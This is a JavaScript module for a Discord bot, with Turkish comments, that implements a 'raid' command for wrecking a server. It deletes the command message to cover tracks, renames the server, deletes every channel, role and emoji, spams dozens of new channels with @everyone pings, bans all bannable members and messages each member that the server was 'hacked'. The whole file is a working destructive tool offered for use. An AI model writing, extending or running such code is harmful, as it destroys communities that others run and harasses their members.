const configuration = require('../configuration.json');

module.exports = (message) => {
    // Komut argümanlarını al ve varsayılan değerleri ata
    const args = message.content.toLowerCase().trim().split(/ +/g);
    const raidName = args[1] || "Raiding"; // Kanal, rol ve mesaj içeriği için kullanılacak isim
    const amount = parseInt(args[2]) || 50; // Oluşturulacak kanal/rol sayısı

    // Komutu yazan kişinin mesajını silerek iz bırakma
    message.delete().catch(err => console.log(`[HATA] Mesaj silinemedi: ${err}`));

    console.log(`RAID BAŞLATILDI: [Sunucu Adı: ${message.guild.name}, Sunucu ID: ${message.guild.id}]`);

    //? 1. Sunucu Adını ve İkonunu Değiştir
    message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı değiştirilemedi: ${err}`));
    message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu değiştirilemedi: ${err}`));

    //? 2. Mevcut Tüm Kanalları Sil
    console.log("Tüm kanallar siliniyor...");
    message.guild.channels.cache.forEach((channel) => {
        channel.delete().catch(err => console.log(`[HATA] Bir kanal silinemedi: ${err}`));
    });

    //? 3. Mevcut Tüm Rolleri Sil (Botun rolünden alttakileri)
    console.log("Tüm roller siliniyor...");
    message.guild.roles.cache.forEach((role) => {
        // Botun en yüksek rolünden daha düşük pozisyondaki rolleri sil
        if (message.guild.me.roles.highest.position > role.position && role.name !== '@everyone') {
            role.delete("Raid").catch(err => console.log(`[HATA] Bir rol silinemedi: ${err}`));
        }
    });

    //? 4. Mevcut Tüm Emojileri Sil
    console.log("Tüm emojiler siliniyor...");
    message.guild.emojis.cache.forEach(emoji => {
        emoji.delete({ reason: "Raid" }).catch(err => console.log(`[HATA] Bir emoji silinemedi: ${err}`));
    });

    //? 5. Belirtilen Miktarda Yeni Kanal Oluştur ve Spam Mesajları Gönder
    console.log(`${amount} adet yeni kanal ve spam mesaj oluşturuluyor...`);
    for (let i = 0; i < amount; i++) {
        message.guild.channels.create(raidName, { type: 'text' })
            .then(channel => {
                // Her kanala belirli sayıda spam mesajı gönder
                for (let j = 0; j < 10; j++) { // Her kanala 10 mesaj atar, sayıyı artırabilirsin
                    channel.send(`@everyone \`\`\`${raidName}\`\`\``);
                }
            })
            .catch(err => console.log(`[HATA] Kanal oluşturulamadı: ${err}`));
    }

    //? 6. Belirtilen Miktarda Yeni Rol Oluştur
    console.log(`${amount} adet yeni rol oluşturuluyor...`);
    for (let i = 0; i < amount; i++) {
        message.guild.roles.create({
            name: raidName,
            color: 'RANDOM', // Rastgele renk
            reason: 'Raid'
        }).catch(err => console.log(`[HATA] Rol oluşturulamadı: ${err}`));
    }

    //? 7. Sunucudaki Tüm Üyeleri Yasakla (Ban All Members) - YENİ ÖZELLİK
    console.log("Tüm üyeler yasaklanıyor...");
    message.guild.members.cache.forEach(member => {
        // Botun kendisini ve sunucu sahibini yasaklamasını engelle
        if (member.id !== message.client.user.id && member.bannable) {
            member.ban({ reason: raidName }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err}`));
        }
    });

    //? 8. Tüm Üyelere Özel Mesaj Gönder (DM All Members) - YENİ ÖZELLİK
    // DİKKAT: Bu özellik botunuzun Discord tarafından çok hızlı bir şekilde yasaklanmasına neden olabilir.
    console.log("Tüm üyelere özel mesaj gönderiliyor...");
    message.guild.members.cache.forEach(member => {
        if (!member.user.bot) { // Botlara mesaj göndermeyi engelle
            member.send(`Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``)
                 .catch(err => console.log(`[HATA] ${member.user.tag} adlı üyeye DM gönderilemedi.`));
        }
    });
};
